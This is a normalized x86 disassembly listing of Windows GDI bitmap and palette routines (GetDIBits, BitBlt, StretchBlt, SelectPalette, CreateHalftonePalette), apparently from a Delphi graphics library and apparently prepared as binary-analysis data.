mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026dc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c768
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d3ec
call sub_41c768
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c768
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d3ec
call sub_41c768
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41df34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_40393c
call sub_40393c
jmp r-xdata
sub_4219dd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_4219ec
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_4038b8
call sub_40390c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_421a4c
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_421ab0
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_420fa4
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_421cab
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41df34
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41df34
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41df34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_421c63
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_4213e8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_421cbc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f0b4
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_421214
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_421d24
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax esi
call sub_422434
mov eax [ esi + 0x28 ]
call sub_421218
mov eax [ esi + 0x2c ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4142fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_421d60
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_421e18
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b18
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_422704
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_421214
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_421218
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414328
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_421e50
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_422434
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421edf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_421a4c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_4213e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421ee4
mov eax [ ebp - 0x8 ]
call sub_41be98
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4038b8
call sub_40390c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_421f10
push ebx
mov ebx eax
mov eax ebx
call sub_422204
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d078
pop ebx
retn
sub_421f40
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415a48
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_422434
lea eax [ ebx + 0x2c ]
call sub_40d078
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_422704
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_421fb4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41dc10
mov eax ebx
call sub_422544
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_422340
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_4221f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41db3c
push eax
call SetStretchBltMode
mov eax ebx
call sub_422284
mov dl [ r-xdata ]
call sub_41dc10
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_4224e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_422284
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4221f7
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_422185
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41df34
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_422284
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41e0d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_422204
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_422444
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_421e50
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41de8c
sub_422284
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_422444
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_421020
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_421f10
sub_4222cc
push ebx
mov ebx eax
mov eax ebx
call sub_422434
mov eax ebx
call sub_422444
mov edx ebx
mov eax ebx
call sub_421f10
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_4222f0
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_422370
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41c768
mov eax ebx
call sub_422340
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_422284
xor edx edx
pop ecx
call sub_41dac8
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4223c0
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_422544
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4213e8
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_422444
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_4159e4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4224c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_4224e4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_422434
mov eax ebx
call sub_422444
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_422370
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_421ab0
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_420fa4
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_422544
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41e624
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_420fa4
push 0x0
call GetDC
call sub_41df34
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_4225fc
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41ddfc
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_421e50
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_422434
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402b18
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_422680
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_4159c4
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_422d94
pop esi
pop ebx
retn
sub_4226a4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push ecx
push 0x2
mov eax [ r-xdata ]
mov cl 0x1
xchg edx ecx
call sub_416384
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4226f8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42282c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4226ff
mov eax [ ebp - 0x4 ]
call sub_403104
retn
sub_422704
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42278b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4032b4
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4227eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_421218
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_421214
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4227f2
push rw-data
call LeaveCriticalSection
retn
sub_422804
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_422d94
pop edx
pop edi
pop esi
pop ebx
retn
sub_42282c
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026bc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
